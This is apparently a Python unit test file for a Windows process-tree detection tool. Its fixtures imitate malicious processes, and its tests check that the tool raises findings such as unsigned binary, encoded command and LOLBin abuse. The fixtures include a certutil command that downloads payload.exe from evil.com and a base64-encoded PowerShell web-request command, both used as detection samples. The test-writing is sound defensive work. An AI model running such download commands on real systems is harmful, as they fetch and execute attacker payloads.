import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from layer3_validate import check, RiskFinding, ValidationResult
from layer2_guid import ProcessNode

def make_nodes():
    return {
        'GUID-A': ProcessNode(
            guid='GUID-A', name='svchost.exe',
            path='C:\\Windows\\System32\\svchost.exe',
            cmd='svchost.exe -k netsvcs', user='NT AUTHORITY\\SYSTEM',
            md5='7b88d0896fbf43469a9959d59824a514',
            sign='Microsoft Windows Publisher', integrity='System',
        ),
        'GUID-B': ProcessNode(
            guid='GUID-B', name='evil.exe',
            path='C:\\Users\\admin\\AppData\\Local\\Temp\\evil.exe',
            cmd='evil.exe --connect 1.2.3.4', user='CORP\\admin',
            md5='deadbeefdeadbeefdeadbeefdeadbeef',
            sign='', integrity='High',
        ),
        'GUID-D': ProcessNode(
            guid='GUID-D', name='powershell.exe',
            path='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            cmd='powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==',
            user='CORP\\admin', md5='def456', sign='Microsoft Windows', integrity='High',
        ),
        'GUID-FAKE-SVC': ProcessNode(
            guid='GUID-FAKE-SVC', name='svchost.exe',
            path='C:\\Users\\Public\\svchost.exe',
            cmd='svchost.exe -service', user='NT AUTHORITY\\SYSTEM',
            md5='fakemd5', sign='', integrity='System',
        ),
        'GUID-E': ProcessNode(
            guid='GUID-E', name='certutil.exe',
            path='C:\\Windows\\System32\\certutil.exe',
            cmd='certutil.exe -urlcache -split -f http://evil.com/payload.exe',
            user='CORP\\admin', md5='certmd5', sign='Microsoft Windows', integrity='High',
        ),
    }

def make_edges():
    return [
        ('GUID-A', 'GUID-B', 'spawn'),
        ('GUID-B', 'GUID-D', 'spawn'),
        ('GUID-B', 'GUID-FAKE-SVC', 'spawn'),
        ('GUID-B', 'GUID-E', 'spawn'),
    ]


def test_check_finds_path_abnormal():
    nodes = make_nodes()
    edges = make_edges()
    result = check(nodes, edges)
    path_findings = [f for f in result.findings if f.risk_type == 'PATH_ABNORMAL']
    assert len(path_findings) >= 1
    assert any(f.guid == 'GUID-FAKE-SVC' for f in path_findings)


def test_check_finds_unsigned():
    nodes = make_nodes()
    edges = make_edges()
    result = check(nodes, edges)
    unsigned = [f for f in result.findings if f.risk_type == 'UNSIGNED']
    assert any(f.guid == 'GUID-B' for f in unsigned)


def test_check_finds_encoded_cmd():
    nodes = make_nodes()
    edges = make_edges()
    result = check(nodes, edges)
    encoded = [f for f in result.findings if f.risk_type == 'ENCODED_CMD']
    assert any(f.guid == 'GUID-D' for f in encoded)


def test_check_finds_suspicious_dir():
    nodes = make_nodes()
    edges = make_edges()
    result = check(nodes, edges)
    sus_dir = [f for f in result.findings if f.risk_type == 'SUSPICIOUS_DIR']
    assert any(f.guid == 'GUID-B' for f in sus_dir)


def test_check_finds_lolbin():
    nodes = make_nodes()
    edges = make_edges()
    result = check(nodes, edges)
    lolbin = [f for f in result.findings if f.risk_type == 'LOLBIN']
    assert any(f.guid == 'GUID-E' for f in lolbin)


def test_check_finds_abnormal_parent():
    nodes = make_nodes()
    edges = make_edges()
    result = check(nodes, edges)
    parent_findings = [f for f in result.findings if f.risk_type == 'ABNORMAL_PARENT']
    assert any(f.guid == 'GUID-FAKE-SVC' for f in parent_findings)


if __name__ == '__main__':
    test_check_finds_path_abnormal()
    test_check_finds_unsigned()
    test_check_finds_encoded_cmd()
    test_check_finds_suspicious_dir()
    test_check_finds_lolbin()
    test_check_finds_abnormal_parent()
    print("PASS: test_layer3")
